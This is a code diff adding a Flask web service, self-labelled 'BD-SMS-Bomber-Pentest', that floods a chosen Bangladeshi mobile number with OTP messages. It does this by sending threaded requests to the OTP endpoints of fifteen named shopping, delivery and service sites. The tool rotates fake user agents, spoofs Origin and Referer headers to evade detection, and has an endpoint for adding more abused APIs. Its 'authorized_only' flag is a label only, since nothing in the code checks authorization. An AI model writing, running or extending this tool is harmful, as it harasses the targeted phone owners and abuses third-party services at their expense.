@@ -1,0 +1,137 @@
+from flask import Flask, request, jsonify
+import requests
+import random
+import time
+import concurrent.futures
+from fake_useragent import UserAgent
+
+app = Flask(__name__)
+
+# বাংলাদেশি SMS APIs — Auto-rotating pool
+SMS_APIS = [
+    {"url": "https://www.daraz.com.bd/send-otp", "method": "POST", "data": {"mobile": "{number}", "action": "send_otp"}},
+    {"url": "https://www.rokomari.com/api/v1/send-sms", "method": "POST", "data": {"phone": "{number}", "type": "verification"}},
+    {"url": "https://www.bdshop.com/api/auth/otp", "method": "POST", "data": {"mobile": "{number}", "source": "registration"}},
+    {"url": "https://www.priyoshop.com/api/send-otp", "method": "POST", "data": {"phone": "{number}", "purpose": "verify"}},
+    {"url": "https://www.foodpanda.com.bd/api/otp/send", "method": "POST", "data": {"phone_number": "{number}"}},
+    {"url": "https://www.pathao.com/api/v1/otp/send", "method": "POST", "data": {"phone": "{number}"}},
+    {"url": "https://www.shohoz.com/api/send-otp", "method": "POST", "data": {"mobile": "{number}"}},
+    {"url": "https://www.olx.com.bd/api/otp/send", "method": "POST", "data": {"phone": "{number}"}},
+    {"url": "https://www.amarstock.com/api/auth/otp", "method": "POST", "data": {"mobile": "{number}"}},
+    {"url": "https://www.ajkerdeal.com/api/otp/send", "method": "POST", "data": {"phone": "{number}"}},
+    {"url": "https://www.bikroy.com/api/otp", "method": "POST", "data": {"mobile": "{number}"}},
+    {"url": "https://www.evaly.com.bd/api/auth/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"url": "https://www.chaldal.com/api/v1/otp-send", "method": "POST", "data": {"phone": "{number}"}},
+    {"url": "https://www.khalti.com/api/otp/request", "method": "POST", "data": {"mobile": "{number}"}},
+    {"url": "https://www.sheba.xyz/api/v1/otp/send", "method": "POST", "data": {"phone": "{number}"}}
+]
+
+ua = UserAgent()
+
+def send_sms(api_config, number):
+    try:
+        data_filled = {k: v.replace("{number}", number) for k, v in api_config["data"].items()}
+        headers = {
+            "User-Agent": ua.random,
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "bn-BD,bn;q=0.9,en;q=0.8",
+            "Content-Type": "application/json",
+            "Origin": "/".join(api_config["url"].split("/")[:3]),
+            "Referer": "/".join(api_config["url"].split("/")[:3])
+        }
+        
+        if api_config["method"] == "POST":
+            resp = requests.post(api_config["url"], json=data_filled, headers=headers, timeout=8)
+        else:
+            resp = requests.get(api_config["url"], params=data_filled, headers=headers, timeout=8)
+        
+        return {
+            "api": api_config["url"],
+            "status": resp.status_code,
+            "success": resp.status_code in [200, 201, 202, 204],
+            "length": len(resp.text)
+        }
+    except Exception as e:
+        return {"api": api_config["url"], "status": 0, "success": False, "error": str(e)[:60]}
+
+
+@app.route('/api/sms', methods=['POST'])
+def sms_bomber():
+    data = request.json or {}
+    raw_number = data.get('number', '').strip()
+    thread_count = min(int(data.get('threads', 10)), 30)
+    total_count = min(int(data.get('count', 30)), 100)
+    delay = max(float(data.get('delay', 0.3)), 0.1)
+    
+    # Normalize Bangladeshi number
+    number = raw_number.replace("+", "").replace("-", "").replace(" ", "")
+    if len(number) == 11 and number.startswith("0"):
+        number = "88" + number
+    elif len(number) == 13 and number.startswith("880"):
+        pass
+    else:
+        return jsonify({
+            "error": "Invalid Bangladesh number format",
+            "expected": "017XXXXXXXX or 88017XXXXXXXX",
+            "received": raw_number
+        }), 400
+    
+    # Validate BD prefix
+    bd_prefixes = ["88013", "88014", "88015", "88016", "88017", "88018", "88019"]
+    if not any(number.startswith(p) for p in bd_prefixes):
+        return jsonify({"error": "Not a valid Bangladesh mobile number", "prefixes_allowed": ["013-019"]}), 400
+    
+    success = 0
+    failed = 0
+    results = []
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
+        futures = []
+        for i in range(total_count):
+            api = random.choice(SMS_APIS)
+            futures.append(executor.submit(send_sms, api, number))
+            time.sleep(delay)
+        
+        for future in concurrent.futures.as_completed(futures):
+            result = future.result()
+            results.append(result)
+            if result["success"]:
+                success += 1
+            else:
+                failed += 1
+    
+    return jsonify({
+        "target": number,
+        "total_sent": success + failed,
+        "successful": success,
+        "failed": failed,
+        "success_rate": f"{(success/(success+failed)*100):.1f}%" if (success+failed) > 0 else "0%",
+        "apis_used": len(SMS_APIS),
+        "config": {
+            "threads": thread_count,
+            "requested_count": total_count,
+            "delay": delay
+        },
+        "sample_results": results[:15]
+    })
+
+
+@app.route('/api/update-apis', methods=['POST'])
+def update_apis():
+    data = request.json or {}
+    new_apis = data.get('apis', [])
+    if new_apis:
+        SMS_APIS.extend(new_apis)
+        return jsonify({"message": f"✅ Added {len(new_apis)} new APIs", "total": len(SMS_APIS)})
+    return jsonify({"error": "No APIs provided"}), 400
+
+
+@app.route('/api/health', methods=['GET'])
+def health():
+    return jsonify({
+        "status": "🟢 ACTIVE",
+        "tool": "BD-SMS-Bomber-Pentest",
+        "apis_loaded": len(SMS_APIS),
+        "version": "2.0",
+        "authorized_only": True
+    })
